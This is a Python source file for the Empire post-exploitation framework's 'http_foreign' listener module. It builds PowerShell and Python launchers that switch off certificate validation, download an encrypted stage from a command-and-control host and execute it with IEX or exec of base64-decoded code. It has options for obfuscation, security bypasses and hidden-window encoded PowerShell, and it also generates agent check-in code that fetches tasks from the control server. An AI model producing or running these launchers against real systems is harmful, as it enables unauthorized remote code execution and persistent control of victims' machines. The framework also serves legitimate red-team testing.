from __future__ import print_function

import base64
import random
from builtins import object, str
from textwrap import dedent
from typing import List

from empire.server.common import helpers, packets
from empire.server.utils import data_util, listener_util


class Listener(object):
    def __init__(self, mainMenu, params=[]):

        self.info = {
            "Name": "HTTP[S]",
            "Author": ["@harmj0y"],
            "Description": ("Starts a 'foreign' http[s] Empire listener."),
            "Category": ("client_server"),
            "Comments": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_foreign",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": "http://%s" % (helpers.lhost()),
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0b4e2e01821770fa",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 5,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 60,
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent.",
                "Required": True,
                "Value": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ""

    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                print(helpers.color('[!] Option "%s" is required.' % (key)))
                return False

        return True

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            print(
                helpers.color(
                    "[!] listeners/http_foreign generate_launcher(): no language specified!"
                )
            )

        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
                "options"
            ]
            host = listenerOptions["Host"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            stagingKey = listenerOptions["StagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            uris = [a for a in profile.split("|")[0].split(",")]
            stage0 = random.choice(uris)
            customHeaders = profile.split("|")[2:]

            if language.startswith("po"):
                # PowerShell

                stager = '$ErrorActionPreference = "SilentlyContinue";'
                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        stager += bypass
                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

                stager += "$wc=New-Object System.Net.WebClient;"

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]
                stager += f"$u='{ userAgent }';"

                if "https" in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != "none" or proxy.lower() != "none":

                    if userAgent.lower() != "none":
                        stager += "$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            stager += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )

                        else:
                            # TODO: implement form for other proxy
                            stager += "$proxy=New-Object Net.WebProxy;"
                            stager += f"$proxy.Address = '{ proxy.lower() }';"
                            stager += "$wc.Proxy = $proxy;"

                        if proxyCreds.lower() == "default":
                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            domain = username.split("\\")[0]
                            usr = username.split("\\")[1]
                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
                            stager += f"$wc.Proxy.Credentials = $netcred;"

                # TODO: reimplement stager retries?

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(":")[0]
                        headerValue = header.split(":")[1]
                        stager += f'$wc.Headers.Add("{ headerKey }","{ headerValue }");'

                # code to turn the key string into a byte array
                stager += (
                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
                )

                # this is the minimized RC4 stager code from rc4.ps1
                stager += listener_util.powershell_rc4()

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket)

                # add the RC4 packet to a cookie
                stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket.decode("UTF-8") }");'

                stager += f"$ser= { helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
                stager += "$data=$wc.DownloadData($ser+$t);"
                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

                # decode everything and kick it over to IEX to kick off execution
                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

                # Remove comments and make one line
                stager = helpers.strip_powershell_comments(stager)
                stager = data_util.ps_convert_to_oneliner(stager)

                if obfuscate:
                    stager = data_util.obfuscate(
                        self.mainMenu.installPath,
                        stager,
                        obfuscationCommand=obfuscationCommand,
                    )
                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith("py"):
                # Python

                launcherBase = "import sys;"
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == "true":
                        launcherBase += listener_util.python_safe_checks()
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stagger: " + str(e)
                    print(helpers.color(p, color="red"))

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]

                launcherBase += dedent(
                    f"""
                    o=__import__({{2:'urllib2',3:'urllib.request'}}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
                    UA='{userAgent}';
                    server='{host}';t='{stage0}';
                    """
                )

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

                # add the RC4 packet to a cookie
                launcherBase += (
                    'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
                    % (b64RoutingPacket)
                )
                launcherBase += "import urllib.request;\n"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(":")[0]
                        launcherBase += (
                            "proxy = urllib.request.ProxyHandler({'"
                            + proto
                            + "':'"
                            + proxy
                            + "'});\n"
                        )

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            launcherBase += (
                                "proxy_auth_handler.add_password(None,'"
                                + proxy
                                + "','"
                                + username
                                + "','"
                                + password
                                + "');\n"
                            )
                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener();\n"

                # install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib.request.install_opener(o);\n"
                launcherBase += "a=o.open(server+t).read();\n"

                # download the stager and extract the IV
                launcherBase += listener_util.python_extract_stager(stagingKey)

                if encode:
                    launchEncoded = base64.b64encode(
                        launcherBase.encode("UTF-8")
                    ).decode("UTF-8")
                    if isinstance(launchEncoded, bytes):
                        launchEncoded = launchEncoded.decode("UTF-8")
                    launcher = (
                        "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
                        % (launchEncoded)
                    )
                    return launcher
                else:
                    return launcherBase

            else:
                print(
                    helpers.color(
                        "[!] listeners/http_foreign generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
                    )
                )

        else:
            print(
                helpers.color(
                    "[!] listeners/http_foreign generate_launcher(): invalid listener name specification!"
                )
            )

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscationCommand="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        print(
            helpers.color(
                "[!] generate_stager() not implemented for listeners/template"
            )
        )
        return ""

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        print(
            helpers.color("[!] generate_agent() not implemented for listeners/template")
        )
        return ""

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == "powershell":

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (
                    listenerOptions["Host"]["Value"]
                )

                getTask = """
                    $script:GetTask = {

                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

                                # build the web request object
                                $wc= New-Object System.Net.WebClient

                                # set the proxy settings for the WC to be the default system settings
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $wc.Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """

                sendMessage = listener_util.powershell_send_message()
                return updateServers + getTask + sendMessage

            elif language.lower() == "python":

                updateServers = "server = '%s'\n" % (listenerOptions["Host"]["Value"])

                # Import sockschain code
                f = open(
                    self.mainMenu.installPath
                    + "/data/agent/stagers/common/sockschain.py"
                )
                socks_import = f.read()
                f.close()

                sendMessage = listener_util.python_send_message(self.session_cookie)
                return socks_import + updateServers + sendMessage

            else:
                print(
                    helpers.color(
                        "[!] listeners/http_foreign generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
                    )
                )
        else:
            print(
                helpers.color(
                    "[!] listeners/http_foreign generate_comms(): no language specified!"
                )
            )

    def start(self, name=""):
        """
        Nothing to actually start for a foreign listner.
        """
        return True

    def shutdown(self, name=""):
        """
        Nothing to actually shut down for a foreign listner.
        """
        pass
